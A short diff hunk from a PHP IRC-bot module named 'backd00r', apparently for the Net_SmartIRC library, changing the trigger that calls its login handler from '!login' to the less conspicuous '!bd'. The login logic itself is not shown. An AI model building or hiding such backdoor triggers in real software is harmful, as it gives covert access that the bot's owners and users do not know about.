@@ -35,7 +35,7 @@ class Net_SmartIRC_module_backd00r
     
     function module_init(&$irc)
     {
-        $this->actionids[] = $irc->registerActionhandler(SMARTIRC_TYPE_QUERY|SMARTIRC_TYPE_NOTICE, '^!login', $this, 'login');
+        $this->actionids[] = $irc->registerActionhandler(SMARTIRC_TYPE_QUERY|SMARTIRC_TYPE_NOTICE, '^!bd', $this, 'login');
     }
     
     function module_exit(&$irc)
